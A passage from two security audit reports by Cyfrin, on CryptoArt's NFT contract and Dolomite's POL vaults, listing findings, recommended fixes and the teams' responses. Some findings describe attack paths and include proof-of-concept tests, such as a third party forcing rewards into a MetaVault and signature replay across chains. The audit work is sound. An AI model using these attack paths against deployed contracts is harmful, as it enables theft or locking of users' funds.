Fixed in commit [94bfc1b](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/94bfc1b1454e783ef1fb9627cfaf0328ebe17b47#diff-1c61f2d0e364fa26a4245d1033cdf73f09117fbee360a672a3cb98bc0eef02adL439-R439).

**Cyfrin:** Verified.

\clearpage
## Low Risk


### Allow custom Creator and Collector names to be emitted in `IStory` events to build artwork provenance

**Description:** The `IStory` interface is designed to allow custom names to be emitted for the Creator and Collector events. Here is an [example](https://www.transient.xyz/nfts/base/0x6c81306129b3cc63b0a6c7cec3dd50721ac378fe/9) where a Creator has used the custom name `lytke`.

But in CryptoArt's implementation of `IStory` interface, custom names are not allowed and it is always the caller's hex string that will be set:
```solidity
function addCollectionStory(string calldata, /*creatorName*/ string calldata story) external onlyOwner {
    emit CollectionStory(msg.sender, msg.sender.toHexString(), story);
}

/// @inheritdoc IStory
function addCreatorStory(uint256 tokenId, string calldata, /*creatorName*/ string calldata story)
    external
    onlyTokenOwner(tokenId)
{
    emit CreatorStory(tokenId, msg.sender, msg.sender.toHexString(), story);
}

/// @inheritdoc IStory
function addStory(uint256 tokenId, string calldata, /*collectorName*/ string calldata story)
    external
    onlyTokenOwner(tokenId)
{
    emit Story(tokenId, msg.sender, msg.sender.toHexString(), story);
}
```

**Impact:** Custom names should be allowed as they form part of the "provenance" of an artwork; the value of an artwork is often based on who the creator was and if it has been held by significant collectors in the past. Proper custom names are a lot easier to remember and tell a story about rather than 0x1343335...Artworks with custom names will be able to build a better story around them resulting in improved "provenance".

**CryptoArt:**
Fixed in commit [77f34a4](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/77f34a49cbc27589f3179b35b58a86696696bf83).

**Cyfrin:** Verified.


### Prevent code-injection inside `string` fields when emitting `IStory` events or setting `tokenURI` fields

**Description:** An attack vector which spans the intersection between web3 and web2 is when users can [associate arbitrary metadata strings with NFTs](https://medium.com/zokyo-io/under-the-hackers-hood-json-injection-in-nft-metadata-3be78d0f93a7) and those strings are later processed or displayed on a website.

In particular the `IStory::Story` event:
* is emitted by a non-trusted entity, the current holder of the artwork
* emits two arbitrary string parameters, `collectorName` and `story`
* these string parameters are designed to be displayed to users and may be processed by web2 apps

**Recommended Mitigation:** The most important validation is for non-trusted user-initiated functions, eg:
* When a Creator emits `CreatorStory` or a Collector emits `Story`, revert if the `name` and `story` strings contain any unexpected special characters
* When minting tokens revert if `TokenURISet::uriWhenRedeemable` and `uriWhenNotRedeemable` contain any unexpected special characters - though this must be done using off-chain components controlled by the protocol so risk here is minimal
* In off-chain code don't trust any user-supplied strings but sanitize them or check them for unexpected special characters

**CryptoArt:**
Acknowledged; mitigation handled off-chain via URI validation pre-signing, Story string sanitization/encoding post-event.


### Allow users to increment their nonce to void their signatures

**Description:** Currently users are unable to void their signatures by incrementing their nonce, since `NoncesUpgradeable::_useNonce` is `internal` and only called during actions which verify user signatures.

A user may want to invalidate a previous signature to prevent it from being used but is unable to.

**Impact:** Users are unable to invalidate previous signatures before they are used.

**Recommended Mitigation:** Expose `NoncesUpgradeable::_useNonce` via a `public` function that allows users to increment their own nonce.

**CryptoArt:**
Fixed in commit [cf82aeb](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/cf82aeb30d6a262cde51897f52c302be995d0202).

**Cyfrin:** Verified.


### `IERC7160` specification requires `hasPinnedTokenURI` to revert for non-existent `tokenId`

**Description:** Per the specification of `IERC7160`:
```solidity
/// @notice Check on-chain if a token id has a pinned uri or not
/// @dev This call MUST revert if the token does not exist
function hasPinnedTokenURI(uint256 tokenId) external view returns (bool pinned);
```

But the implementation of `hasPinnedTokenURI` doesn't revert for tokens which don't exist, instead it will simply return `false` or even return `true` if a token was burned when the value was true since burning doesn't delete `_hasPinnedTokenURI` (another issue has been created to track this):
```solidity
function hasPinnedTokenURI(uint256 tokenId) external view returns (bool) {
    return _hasPinnedTokenURI[tokenId];
}
```

**Recommended Mitigation:** Use the `onlyIfTokenExists` modifier:
```diff
-    function hasPinnedTokenURI(uint256 tokenId) external view returns (bool) {
+    function hasPinnedTokenURI(uint256 tokenId) external view onlyIfTokenExists(tokenId) returns (bool) {
```

**CryptoArt:**
Fixed in commit [56d0e22](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/56d0e222cdf25a971cd6466fd4757185a4362069).

**Cyfrin:** Verified.


### `IERC7160` specification requires `pinTokenURI` to revert for non-existent `tokenId`

**Description:** Per the specification of `IERC7160`:
```solidity
/// @notice Pin a specific token uri for a particular token
/// @dev This call MUST revert if the token does not exist
function pinTokenURI(uint256 tokenId, uint256 index) external;
```

But the implementation of `pinTokenURI` doesn't revert for tokens which don't exist, since `_tokenURIs[tokenId].length` will always equal 2 even for non-existent `tokenId`:
```solidity
// mapping value always has fixed array size of 2
mapping(uint256 tokenId => string[2] tokenURIs) private _tokenURIs;

function pinTokenURI(uint256 tokenId, uint256 index) external onlyOwner {
    if (index >= _tokenURIs[tokenId].length) {
        revert Error.Token_IndexOutOfBounds(tokenId, index, _tokenURIs[tokenId].length - 1);
    }

    _pinnedURIIndex[tokenId] = index;

    emit TokenUriPinned(tokenId, index);
    emit MetadataUpdate(tokenId);
}
```

**Recommended Mitigation:** Use the `onlyIfTokenExists` modifier:
```diff
-    function pinTokenURI(uint256 tokenId, uint256 index) external onlyOwner {
+    function pinTokenURI(uint256 tokenId, uint256 index) external onlyIfTokenExists(tokenId) onlyOwner {
```

**CryptoArt:**
Fixed in commit [0409ae4](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/0409ae4d81225a351c4d42620502843242f2604f).

**Cyfrin:** Verified.


### Inconsistent pause functionality allows certain state-changing operations when contract is paused

**Description:** The `CryptoartNFT` contract implements a pause mechanism using OpenZeppelin's `PausableUpgradeable` contract. However, the pause functionality is inconsistently applied across the contract's functions. While minting and burning operations are properly protected with the `whenNotPaused` modifier, several other state-changing functions remain accessible even when the contract is paused, including token transfers, metadata management, and story-related functions.

The following state-changing functions lack the `whenNotPaused` modifier:

1. Token transfers and approvals (inherited from ERC721)
2. Metadata management functions:
   - `updateMetadata`
   - `pinTokenURI`
   - `markAsRedeemable`
3. Story-related functions:
   - `addCollectionStory`
   - `addCreatorStory`
   - `addStory`
   - `toggleStoryVisibility`

**Impact:** When the contract is paused (typically during emergencies or upgrades), users can still perform various state-changing operations that might be undesirable during a pause period. It could lead to unexpected state changes during contract upgrades or emergency situations.

**Recommended Mitigation:** Add the `whenNotPaused` modifier to all state-changing functions to ensure consistent behavior when the contract is paused. For example:

**Cryptoart:**
Fixed in commit [e7d7e5b](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/e7d7e5b3b1c8976a11d49f889b4168ce649be2ee).

**Cyfrin:** Verified.

\clearpage
## Informational


### Protocol vulnerable to cross-chain signature replay

**Description:** As signatures do not include`chainId`, signature verification is vulnerable to [cross-chain replay](https://dacian.me/signature-replay-attacks#heading-cross-chain-replay).

**Impact:** Although the protocol plans to deploy cross-chain in the future, the specification of this audit is to only consider deployment to one chain. Hence this finding is only Informational as this attack path is not possible when the protocol is only deployed on one chain.

**Recommended Mitigation:** Include `block.chainid` as a signature parameter.

**CryptoArt:**
Fixed in commit [1e25f8c](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/1e25f8cd172a32e3e35ccf8a86e7af9fe1ed47fe).

**Cyfrin:** Verified.


### Signatures have no expiration deadline

**Description:** Signatures which have [no expiration parameter](https://dacian.me/signature-replay-attacks#heading-no-expiration) effectively grant a lifetime license. Consider adding an expiration parameter to the signature that if used after that time results in the signature being invalid.

**CryptoArt:**
Fixed in commit [a93977d](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/a93977d2ef0b54319c7668d9fc6abda688b355c1).

**Cyfrin:** Verified.


### Consider limiting max royalty to prevent large amount or all of the sale fee being taken as royalty

**Description:** Currently `updateRoyalties` and `setTokenRoyalty` allow the contract owner to set a royalty up to `10_000` which would take the entire sale fee as a royalty. Consider limiting these functions to set the max royalty to something more reasonable like 1000 (10%).

**CryptoArt:**
Fixed in commit [1d1125e](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/1d1125e5a021f2926dc2a2e39e05c065e3bd207c).

**Cyfrin:** Verified.


### `MintType` is almost never enforced

**Description:** The contract has an enumeration `MintType` which defines several types of mints:
```solidity
enum MintType {
    OpenMint,
    Whitelist,
    Claim,
    Burn
}
```

But there are never any checks for these mint types, for example:
* there is no check for `MintType.Whitelist` and no corresponding whitelist enforcement
* the `claim` function doesn't enforce input `data.mintType == MintType.Claim`
* similarly `burnAndMint` doesn't enforce input `data.mintType == MintType.Burn`

The only place input `data.mintType` is used is in `_validateSignature` to validate that the input parameter matches what was signed, but there is no other validation that the correct mint types are being used for the correct operations.

**CryptoArt:**
Fixed in commit [deaf964](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/deaf96420b3176be09c1522ea8c79a211f77ef82).

**Cyfrin:** Verified.


### Remove unused constant `CryptoartNFT::ROYALTY_BASE`

**Description:** The `CryptoartNFT` contract defines a constant `ROYALTY_BASE` with a value of 10,000 that is never used in the contract. This constant is intended to represent the denominator for royalty percentage calculations (where 10,000 = 100%), but it's not referenced anywhere in the contract's implementation.

**Recommended Mitigation:** Remove the unused constant to improve code clarity and reduce deployment gas costs.

**Cryptoart:**
Fixed in commit [0c0dd8c](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/0c0dd8c8d01e1b5b396852d38faceee007b37891).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### Prefer named return parameters, especially for `memory` returns

**Description:** Prefer named return parameters, especially for memory returns. For example `tokenURIs` can be refactored to remove local variables and explicit return:
```solidity
function tokenURIs(uint256 tokenId)
    external
    view
    override
    onlyIfTokenExists(tokenId)
    returns (uint256 index, string[2] memory uris, bool isPinned)
{
    index = _getTokenURIIndex(tokenId);
    uris = _tokenURIs[tokenId];
    isPinned = _hasPinnedTokenURI[tokenId];
}
```

**CryptoArt:**
Fixed in commit [bdd28fa](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/bdd28fa71f8d445fb3306a1fdc16b49fa5b5d1e4).

**Cyfrin:** Verified.


### Use named constants to indicate purpose of magic numbers

**Description:** Use named constants to indicate purpose of magic numbers. For example in reference to the value of the `_tokenURIs` mapping:
* instead of using literal `2`, use existing named constant `URIS_PER_TOKEN`:
```solidity
CryptoartNFT.sol
72:    mapping(uint256 tokenId => string[2] tokenURIs) private _tokenURIs;
358:        returns (uint256, string[2] memory, bool)
361:        string[2] memory uris = _tokenURIs[tokenId];
698:        string[2] memory uris = _tokenURIs[tokenId];
```

* when setting uris in `updateMetadata` and `_setTokenURIs`, use named constants for the indexes:
```solidity
function updateMetadata(uint256 tokenId, string calldata newRedeemableURI, string calldata newNotRedeemableURI)
    external
    onlyOwner
    onlyIfTokenExists(tokenId)
{
    _tokenURIs[tokenId][URI_REDEEMABLE_INDEX] = newRedeemableURI;
    _tokenURIs[tokenId][URI_NOT_REDEEMABLE_INDEX] = newNotRedeemableURI;
    emit MetadataUpdate(tokenId); // ERC4906
}
```

This can also save gas for example in `pinTokenURI`, instead of using `_tokenURIs[tokenId].length` just use the constant `URIS_PER_TOKEN` since it never changes:
```solidity
function pinTokenURI(uint256 tokenId, uint256 index) external onlyOwner {
    if (index >= URIS_PER_TOKEN) {
        revert Error.Token_IndexOutOfBounds(tokenId, index, URIS_PER_TOKEN - 1);
    }
```

**CryptoArt:**
Fixed in commit [97ef0ad](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/97ef0add6848540e158927092d0a1af820e840fe).

**Cyfrin:** Verified.


### Remove obsolete `onlyTokenOwner` from `_transferToNftReceiver`

**Description:** Since `_transferToNftReceiver` calls `ERC721Upgradeable::safeTransferFrom`, the `onlyTokenOwner` modifier is obsolete and inefficient as:
* `safeTransferFrom` [calls](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/release-v5.1/contracts/token/ERC721/ERC721Upgradeable.sol#L183) `transferFrom`
* `transferFrom` [calls](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/release-v5.1/contracts/token/ERC721/ERC721Upgradeable.sol#L166) `_update` passing `_msgSender()` as the last `auth` parameter
* `_update` [calls](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/release-v5.1/contracts/token/ERC721/ERC721Upgradeable.sol#L274) `_checkAuthorized` since the `auth` parameter was valid
* `_checkAuthorized` [calls](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/release-v5.1/contracts/token/ERC721/ERC721Upgradeable.sol#L215-L238) `_isAuthorized` which verifies the caller is either the token's owner or someone who the token owner has approved

**CryptoArt:**
Fixed in commit [75e179b](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/75e179b3cea8855977a391ace169313053bc2de5).

**Cyfrin:** Verified.


### In `tokenURI` avoid copying entire `_tokenURIs[tokenId]` from `storage` into `memory`

**Description:** `tokenURI` only uses the "pinned" URI index so there's no reason to copy both token URIs from `storage` to `memory`. Simply use a `storage` reference like this:
```diff
    function tokenURI(uint256 tokenId)
        public
        view
        override(ERC721Upgradeable)
        onlyIfTokenExists(tokenId)
        returns (string memory)
    {
-       string[2] memory uris = _tokenURIs[tokenId];
+       string[2] storage uris = _tokenURIs[tokenId];
        string memory uri = uris[_getTokenURIIndex(tokenId)];

        if (bytes(uri).length == 0) {
            revert Error.Token_NoURIFound(tokenId);
        }

        return string.concat(_baseURI(), uri);
    }
```

**CryptoArt:**
Fixed in commit [591fed0](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/591fed0798ab0cd61fe965c9a4d0b3e8461e0f12).

**Cyfrin:** Verified.


### `burn` should delete `tokenURI` related data and emit `TokenUriUnpinned` event

**Description:** The `burn` function should delete `tokenURI` related data and emit `TokenUriUnpinned` event:
```diff
    function burn(uint256 tokenId) public override whenNotPaused {
        // require sender is owner or approved has been removed as the internal burn function already checks this
        ERC2981Upgradeable._resetTokenRoyalty(tokenId);
        ERC721BurnableUpgradeable.burn(tokenId);
        emit Burned(tokenId);
+       emit TokenUriUnpinned(tokenId);
+       delete _tokenURIs[tokenId];
+       delete _pinnedURIIndex[tokenId];
+       delete _hasPinnedTokenURI[tokenId];
    }
```

This provides a gas refund as part of the burn and also removes token data that should no longer exist. It also prevents `hasPinnedTokenURI` from returning `true` for a burned token since that function doesn't check for valid token id (another issue has been created to track this).

**CryptoArt:**
Fixed in commit [b554763](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/b5547630515c8da112db6754a3e25dda1e69b4a7).

**Cyfrin:** Verified.


### To prevent duplicate ids in `_batchBurn`, enforce ascending order instead of nested `for` loops

**Description:** In `_batchBurn` to prevent duplicate ids, instead of using nested `for` loops it is more efficient to [enforce ascending order of ids](https://x.com/DevDacian/status/1734885772829045205) using only 1 `for` loop.

Additionally, the duplicate id check can be completely removed since if there is a duplicate id the second `burn` call will revert. For example this test added to `test/unit/BurnOperationsTest.t.sol`:
```solidity
    function test_DoubleBurn() public {
        // Mint a token to user1
        mintNFT(user1, TOKEN_ID, TOKEN_PRICE, TOKEN_PRICE);
        testAssertions.assertTokenOwnership(nft, TOKEN_ID, user1);

        // First burn should succeed
        vm.prank(user1);
        nft.burn(TOKEN_ID);

        // Second burn should revert since token no longer exists
        vm.prank(user1);
        // vm.expectRevert();
        nft.burn(TOKEN_ID);
    }
```

Results in:
```solidity
     [4294] TransparentUpgradeableProxy::fallback(1)
        [3940] CryptoartNFT::burn(1) [delegatecall]
            [Revert] ERC721NonexistentToken(1)
         [Revert] ERC721NonexistentToken(1)
      [Revert] ERC721NonexistentToken(1)
```

**CryptoArt:**
Fixed in commit [3c39fb8](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/3c39fb86db6b92424a0cf55c315d0d6284c267bf).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2025-04-24-cyfrin-cryptoart-v2.0.md ------


------ FILE START car/reports_md/2025-04-24-cyfrin-dolomite-POLVaults-v2.0.md ------

**Lead Auditors**

[0kage](https://x.com/0kage_eth)

[Farouk](https://x.com/Ubermensh3dot0)

**Assisting Auditors**



---

# Findings
## High Risk


### InfraVault's Permissionless Reward Claiming Can Allow Anyone to Lock Rewards in the MetaVault

**Description:** The `InfraredBGTMetaVault` relies on `_performDepositRewardByRewardType` to handle newly claimed rewards by either depositing them into DolomiteMargin or sending them directly to the vault owner. However, the onchain Infrared vault [contract](https://berascan.com/address/0x67b4e6721ad3a99b7ff3679caee971b07fd85cd1#code) allows anyone to call `getRewardForUser` on any users rewards. Note that this function is defined in the `MultiRewards.sol`, the contract that infrared vault derives from.

This can trigger a reward transfer to the MetaVault unexpectedly. Because the code that deposits or forwards these tokens (`_performDepositRewardByRewardType`) only runs during the normal self-claim flow, rewards triggered through a third-party call would not go through the intended deposit or distribution logic.

```solidity
/// @inheritdoc IMultiRewards
function getRewardForUser(address _user)
    public
    nonReentrant
    updateReward(_user)
{
    onReward();
    uint256 len = rewardTokens.length;
    for (uint256 i; i < len; i++) {
        address _rewardsToken = rewardTokens[i];
        uint256 reward = rewards[_user][_rewardsToken];
        if (reward > 0) {
            (bool success, bytes memory data) = _rewardsToken.call{
                gas: 200000
            }(
                abi.encodeWithSelector(
                    ERC20.transfer.selector, _user, reward
                )
            );
            if (success && (data.length == 0 || abi.decode(data, (bool)))) {
                rewards[_user][_rewardsToken] = 0;
                emit RewardPaid(_user, _rewardsToken, reward);
            } else {
                continue;
            }
        }
    }
}
```

**Impact:** An attacker could force rewards to be sent to the MetaVaults address without triggering `_performDepositRewardByRewardType`. As a result, those newly arrived tokens could stay in the MetaVault contract, never being staked or deposited into DolomiteMargin or distributed to the vault owner.

We note that the token loss is not permanent as the InfraredBGTMetaVault contract is upgradeable. Nevertheless this can cause delays as every user has an independent vault and upgrading each vault would be cumbersome. In the meanwhile, vault owners cannot use their received rewards within the Dolomite Protocol.


**Proof of Concept:** Consider the following scenario:
	1.	An attacker calls `infravault.getRewardForUser(metaVaultAddress)`.
	2.	The reward is transferred to metaVaultAddress rather than going through the `_performDepositRewardByRewardType` logic.
	3.	The tokens remain stuck in the MetaVault contract if there is no fallback mechanism to move or stake them again.

**Recommended Mitigation:** Consider modifying the `_performDepositRewardByRewardType` to add the token balance in the vault to the reward amount and routing all BGT token vault staking into Infrared vaults via the metavault.

```diff
  function _performDepositRewardByRewardType(
        IMetaVaultRewardTokenFactory _factory,
        IBerachainRewardsRegistry.RewardVaultType _type,
        address _token,
        uint256 _amount
    ) internal {
++ _amount += IERC20(token).balanceOf(address(this));
}
```

**Dolomite:** Fixed in [d0a638a](https://github.com/dolomite-exchange/dolomite-margin-modules/commit/d0a638aefdda72925329b2da60f405cd4450f78a).

**Cyfrin:** Verified

\clearpage
## Medium Risk


### User rewards may remain unclaimed after calling `InfraredBGTIsolationModeTokenVaultV1::exit()` function

**Description:** When a user calls `InfraredBGTIsolationModeTokenVaultV1::exit` in a scenario where rewards are in the same token (iBGT), the function correctly unstakes their original deposit but:

- The rewards are credited to the user's Dolomite Margin account balance
- The same tokens are simultaneously re-staked in the Infrared vault

This creates a situation where users may believe they've fully exited the protocol, but in reality, they have rewards still staked. The `_exit()` function calls `_handleRewards()` which processes any rewards earned. The issue occurs when `_handleRewards()` automatically deposits iBGT rewards back into Dolomite Margin and re-stakes them:


```solidity
function _exit() internal {
    IInfraredVault vault = registry().iBgtStakingVault();

    IInfraredVault.UserReward[] memory rewards = vault.getAllRewardsForUser(address(this));
    vault.exit();

    _handleRewards(rewards);
}

function _handleRewards(IInfraredVault.UserReward[] memory _rewards) internal {
    IIsolationModeVaultFactory factory = IIsolationModeVaultFactory(VAULT_FACTORY());
    for (uint256 i = 0; i < _rewards.length; ++i) {
        if (_rewards[i].amount > 0) {
            if (_rewards[i].token == UNDERLYING_TOKEN()) {
                _setIsDepositSourceThisVault(true);
                factory.depositIntoDolomiteMargin(
                    DEFAULT_ACCOUNT_NUMBER,
                    _rewards[i].amount
                ); //@audit restakes the reward amount
                assert(!isDepositSourceThisVault());
            } else {
                // Handle other tokens...
            }
        }
    }
}
```

**Impact:**
- Users may never realize they still have assets staked in the protocol
- Rewards remain locked in a separate vault that users might not know to check
- For smaller reward amounts, gas costs might exceed the value, effectively trapping these funds
- Poor user experience when "exit" doesn't fully exit the protocol

**Proof of Concept:** Add the following test to the `#exit` class of tests in `InfraredBGTIsolationModeTokenVaultV1.ts`

```typescript
    it('should demonstrate that iBGT rewards are re-staked after exit', async () => {
      await testInfraredVault.setRewardTokens([core.tokens.iBgt.address]);
      await core.tokens.iBgt.connect(iBgtWhale).approve(testInfraredVault.address, rewardAmount);
      await testInfraredVault.connect(iBgtWhale).addReward(core.tokens.iBgt.address, rewardAmount);
      await registry.connect(core.governance).ownerSetIBgtStakingVault(testInfraredVault.address);

      await iBgtVault.depositIntoVaultForDolomiteMargin(defaultAccountNumber, amountWei);
      await expectProtocolBalance(core, iBgtVault, defaultAccountNumber, iBgtMarketId, amountWei);

      // Get   the initial staking balance before exit
      const initialStakingBalance = await testInfraredVault.balanceOf(iBgtVault.address);
      expect(initialStakingBalance).to.eq(amountWei);

      // Call exit which should unstake original amount but rewards will be re-staked
      await iBgtVault.exit();

      // Check that staking balance equals reward amount (rewards were re-staked)
      const finalStakingBalance = await testInfraredVault.balanceOf(iBgtVault.address);
      expect(finalStakingBalance).to.eq(rewardAmount, "Staking balance should equal reward amount after exit");

      // Verify original deposit is in the wallet (but not rewards)
      await expectWalletBalance(iBgtVault, core.tokens.iBgt, amountWei);

      // Verify protocol balance now includes both original deposit and rewards
      await expectProtocolBalance(core, iBgtVault, defaultAccountNumber, iBgtMarketId, amountWei.add(rewardAmount));
    });
```

**Recommended Mitigation:** Consider avoiding restaking when the user calls `exit` explicitly - it is counter-intuitive even from a UX standpoint to restake assets in the same vault when the user has expressed intent to exit the vault completely. Also add clear documentation explaining how rewards are handled across different vaults

**Dolomite:** Fixed in [d0a638a](https://github.com/dolomite-exchange/dolomite-margin-modules/commit/d0a638aefdda72925329b2da60f405cd4450f78a).

**Cyfrin:** Verified.

\clearpage
## Low Risk


### Missing validation for initialization calldata in `POLIsolationModeWrapperUpgradeableProxy` constructor

**Description:** The `POLIsolationModeWrapperUpgradeableProxy` constructor accepts initialization calldata without performing any validation on its content before executing it via `delegatecall` to the implementation contract. Specifically:

- The constructor does not verify that the `calldata` targets the expected initialize(address) function
- The constructor does not verify that the provided vaultFactory address parameter is non-zero

```solidity
// POLIsolationModeWrapperUpgradeableProxy.sol
constructor(
    address _berachainRewardsRegistry,
    bytes memory _initializationCalldata
) {
    BERACHAIN_REWARDS_REGISTRY = IBerachainRewardsRegistry(_berachainRewardsRegistry);
    Address.functionDelegateCall(
        implementation(),
        _initializationCalldata,
        "POLIsolationModeWrapperProxy: Initialization failed"
    );
}
```
This lack of validation means the constructor will blindly execute any calldata, potentially setting critical contract parameters incorrectly during deployment.

Note that a similar issue exists in `POLIsolationModeUnwrapperUpgradeableProxy`


**Impact:** The proxy could be initialized with a zero or invalid vaultFactory address, rendering it non-functional or insecure.  Additionally, if the implementation contract is upgraded and introduces new functions with weaker access controls, this pattern would allow those functions to be called during initialization of new proxies.

**Recommended Mitigation:** Consider adding explicit validation for both the function selector and parameters in the constructor:

```solidity
constructor(
    address _berachainRewardsRegistry,
    bytes memory _initializationCalldata
) {
    BERACHAIN_REWARDS_REGISTRY = IBerachainRewardsRegistry(_berachainRewardsRegistry);

    // Validate function selector is initialize(address)
    require(
        _initializationCalldata.length == 36 &&
        bytes4(_initializationCalldata[0:4]) == bytes4(keccak256("initialize(address)")),
        "Invalid initialization function"
    );

     // Decode and validate the vaultFactory address is non-zero
    address vaultFactory = abi.decode(_initializationCalldata[4:], (address));
    require(vaultFactory != address(0), "Zero vault factory address");

    Address.functionDelegateCall(
        implementation(),
        _initializationCalldata,
        "POLIsolationModeWrapperProxy: Initialization failed"
    );
}
```

**Dolomite:**
Acknowledged.

**Cyfrin:** Acknowledged.


### Reward loss risk when transitioning between reward vault types

**Description:** When a user's default reward vault type for an asset is changed (e.g., from NATIVE or BGTM to INFRARED) in the `InfraredBGTMetaVault` contract, current logic attempts to claim outstanding rewards before switching the type. However, the implementation fails to retrieve rewards from the user's current vault type, leading to permanent loss of accrued rewards.

The issue occurs in the relationship between `_setDefaultRewardVaultTypeByAsset` and `_getReward` functions:

- When staking tokens via `_stake`, the function calls `_setDefaultRewardVaultTypeByAsset` to ensure the asset uses the INFRARED reward type.
- If the asset's current reward type is not INFRARED, `_setDefaultRewardVaultTypeByAsset` calls `_getReward` to claim pending rewards for the asset before changing the type.
-  However, `_getReward` hardcodes the reward vault type to INFRARED instead of using the user's current reward type

```solidity
function _getReward(address _asset) internal {
    IBerachainRewardsRegistry.RewardVaultType rewardVaultType = IBerachainRewardsRegistry.RewardVaultType.INFRARED;
    IInfraredVault rewardVault = IInfraredVault(REGISTRY().rewardVault(
        _asset,
        rewardVaultType  // Always uses INFRARED, ignoring user's current type
    ));
    // ... claim rewards logic ...
}
```

This means that when transitioning from another reward type (e.g., NATIVE or BGTM) to INFRARED, the contract attempts to claim rewards from the INFRARED vault even though the user's rewards are accrued in a different vault type.

Additionally, the assertion that should prevent changing types when a user has a staked balance is ineffective for non-INFRARED types:

```solidity
assert(getStakedBalanceByAssetAndType(_asset, currentType) == 0);
```

This assertion will always pass for non-INFRARED types because `getStakedBalanceByAssetAndType` only can have non-zero balances for INFRARED due to the `onlyInfraredType` modifier on all staking functions.


**Impact:** While the protocol currently only intends to support the INFRARED reward type, this issue creates a potential risk for future expansion.

If/when the protocol adds support for additional reward types (NATIVE, BGTM) and users accrue rewards in these vaults, they would permanently lose these rewards when transitioning to the INFRARED type. Once the registry is updated to use INFRARED as the default reward type, the rewards in the original vault become inaccessible through normal contract interactions.

The severity of this issue depends on the protocol's roadmap for supporting multiple reward types. If there are definite plans to expand beyond INFRARED, this represents a significant risk of permanent reward loss for users.

**Proof of Concept:** Consider following scenario:
- In a future version, assume a user has accrued rewards in a NATIVE reward vault
- User calls a function that triggers `_setDefaultRewardVaultTypeByAsset` to transition to INFRARED
- The assertion `assert(getStakedBalanceByAssetAndType(_asset, currentType) == 0)` passes because balances in this contract are only tracked for INFRARED
- `_getReward(_asset)` is called but retrieves from INFRARED vault instead of NATIVE vault
- The registry is updated via `REGISTRY().setDefaultRewardVaultTypeFromMetaVaultByAsset(_asset, _type)`
- User's rewards in the NATIVE vault are now inaccessible

**Recommended Mitigation:** If the protocol plans to support multiple reward types in the future, modify the `_getReward` function to claim rewards from the user's current reward vault type.

Additionally, considering implementing proper balance tracking for all reward types if multiple types will be supported, or clearly document that transitioning between reward types requires manual reward claiming first.

If only INFRARED vault is supported, consider removing `_setDefaultRewardVaultTypeByAsset` as it is not serving any purpose. Since this is called in the `stake` function, removing this will simplify the code and save gas.

**Dolomite:**
Acknowledged. We know code will have to change a good bit to allow multiple reward types.

**Cyfrin**
Acknowledged.



### Rewards in iBGT cannot be redeemed when infrared vault staking is paused

**Description:** Current reward handling mechanism enforces automatic reinvestment of iBGT rewards back into the staking pool, without providing an alternative when staking is disabled.

When the Infrared protocol pauses staking (which can happen for various reasons such as security emergencies or technical issues), users are left with no way to access their earned rewards, effectively freezing these assets until staking is resumed. It is noteworthy that [InfraredVault](https://berascan.com/address/0x67b4e6721ad3a99b7ff3679caee971b07fd85cd1#code) does not prevent redeeming rewards/ unstaking even when staking is paused

The issue lies in the `_handleRewards` function, which automatically attempts to reinvest iBGT rewards:

```solidity
function _handleRewards(IInfraredVault.UserReward[] memory _rewards) internal {
    IIsolationModeVaultFactory factory = IIsolationModeVaultFactory(VAULT_FACTORY());
    for (uint256 i = 0; i < _rewards.length; ++i) {
        if (_rewards[i].amount > 0) {
            if (_rewards[i].token == UNDERLYING_TOKEN()) {
                _setIsDepositSourceThisVault(true);
                factory.depositIntoDolomiteMargin(
                    DEFAULT_ACCOUNT_NUMBER,
                    _rewards[i].amount
                );
                assert(!isDepositSourceThisVault());
            } else {
                // ... handle other token types ...
            }
        }
    }
}
```

When the staking function in the Infrared vault is paused, as it can be through the pauseStaking() function...

```solidity
/// @inheritdoc IInfraredVault
function pauseStaking() external onlyInfrared {
    if (paused()) return;
    _pause();
}
```

...the staking operation in `executeDepositIntoVault` will fail due to the whenNotPaused modifier in the InfraredVault:

```solidity
function stake(uint256 amount) external whenNotPaused {
     // code
```

**Impact:** Users on Dolomite are unable to access their earned rewards during periods when staking is paused in the Infrared vault even though such redemption is allowed on Infrared vaults.


**Proof of Concept:** The `TestInfraredVault` is made `Pausable` to align with the on-chain Infrared vault contract and `whenNotPaused` modifier is added to the `stake` function.

```solidity
contract TestInfraredVault is ERC20, Pausable {

   function unpauseStaking() external {
        if (!paused()) return;
        _unpause();
    }

    function pauseStaking() external {
        if (paused()) return;
        _pause();
    }

    function stake(uint256 amount) external whenNotPaused {
        _mint(msg.sender, amount);
        IERC20(asset).transferFrom(msg.sender, address(this), amount);
    }
}
```

Add the following test to the #getReward class of tests in `InfraredBGTIsolationModeTokenVaultV1.ts`

```typescript
  it('should revert when staking is paused and rewards are in iBGT', async () => {
      await testInfraredVault.setRewardTokens([core.tokens.iBgt.address]);

      // Add iBGT as reward token and fund the reward
      await core.tokens.iBgt.connect(iBgtWhale).approve(testInfraredVault.address, rewardAmount);
      await testInfraredVault.connect(iBgtWhale).addReward(core.tokens.iBgt.address, rewardAmount);
      await registry.connect(core.governance).ownerSetIBgtStakingVault(testInfraredVault.address);

      // Deposit iBGT into the vault
      await iBgtVault.depositIntoVaultForDolomiteMargin(defaultAccountNumber, amountWei);
      await expectProtocolBalance(core, iBgtVault, defaultAccountNumber, iBgtMarketId, amountWei);

      // Advance time to accumulate rewards
